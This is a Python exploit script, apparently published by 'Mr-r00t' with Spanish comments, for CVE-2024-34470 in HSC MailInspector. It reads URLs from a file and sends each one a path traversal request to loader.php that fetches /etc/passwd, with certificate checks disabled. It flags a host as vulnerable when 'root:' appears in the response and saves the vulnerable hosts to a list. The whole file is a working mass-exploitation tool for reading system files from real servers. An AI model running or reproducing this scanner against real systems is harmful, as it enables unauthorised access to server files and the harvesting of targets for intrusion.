import requests
import argparse
from requests.exceptions import SSLError, ConnectionError, Timeout
from colorama import Fore, Style, init
import pyfiglet

# Inicializar colorama
init(autoreset=True)

def fetch_etc_passwd(url):
    # Concatenar la URL base con la ruta específica
    full_url = url.strip() + '/mailinspector/public/loader.php?path=../../../../../../../etc/passwd'
    
    try:
        # Realizar la petición GET con un timeout y verificar el certificado SSL
        response = requests.get(full_url, timeout=10, verify=False)  # verify=False desactiva la verificación SSL
        
        # Comprobar el código de estado de la respuesta
        if response.status_code == 200:
            if "root:" in response.text:
                print(f"{Fore.GREEN}[+] URL {url.strip()} es vulnerable.")
                return True
            else:
                print(f"{Fore.RED}[-] URL {url.strip()} no es vulnerable.")
                return False
        elif response.status_code == 404:
            print(f"{Fore.CYAN}[.] URL {url.strip()} devolvió un error 404 (Not Found).")
            return False
        elif response.status_code == 403:
            print(f"{Fore.CYAN}[.] URL {url.strip()} devolvió un error 403 (Forbidden).")
            return False
        else:
            print(f"{Fore.RED}[-] Error: Status code {response.status_code} para {url.strip()}")
            return False
    
    except SSLError as ssl_err:
        print(f"{Fore.RED}[-] Error SSL para {url.strip()}: {ssl_err}")
        return False
    except ConnectionError as conn_err:
        print(f"{Fore.YELLOW}[!] Error de conexión para {url.strip()}: {conn_err}")
        return False
    except Timeout as timeout_err:
        print(f"{Fore.RED}[-] Timeout en la conexión para {url.strip()}: {timeout_err}")
        return False
    except requests.exceptions.RequestException as req_err:
        print(f"{Fore.RED}[-] Error realizando la petición para {url.strip()}: {req_err}")
        return False

def process_urls_from_file(input_file_path, output_file_path):
    try:
        with open(input_file_path, 'r') as file:
            urls = file.readlines()
        
        vulnerable_urls = []
        for url in urls:
            if fetch_etc_passwd(url):
                vulnerable_urls.append(url.strip())
        
        # Escribir las URLs vulnerables en el archivo de salida
        with open(output_file_path, 'w') as output_file:
            for url in vulnerable_urls:
                output_file.write(url + '\n')
                
    except FileNotFoundError:
        print(f"{Fore.RED}[-] El archivo {input_file_path} no fue encontrado.")
    except Exception as e:
        print(f"{Fore.RED}[-] Error al leer el archivo {input_file_path}: {e}")

def main():
    parser = argparse.ArgumentParser(description='Verificar URLs para vulnerabilidad de lectura de /etc/passwd')
    parser.add_argument('input_file', help='Archivo de entrada con las URLs')
    parser.add_argument('output_file', help='Archivo de salida para las URLs vulnerables')
    
    args = parser.parse_args()
    
    process_urls_from_file(args.input_file, args.output_file)

if __name__ == "__main__":
    # Texto a convertir en ASCII art
    texto = "HSC MailInspector"

    # Crear un objeto Figlet con el estilo deseado
    fig = pyfiglet.Figlet(font='small')

    # Imprimir el texto en ASCII art
    ascii_art = fig.renderText(texto)
    
    ascii_art_colored = (Fore.CYAN + ascii_art)
    print(ascii_art_colored)
    print(Fore.YELLOW + "\___________________ CVE-2024-34470 by Mr-r00t ___________________/")
    print("")
    main()
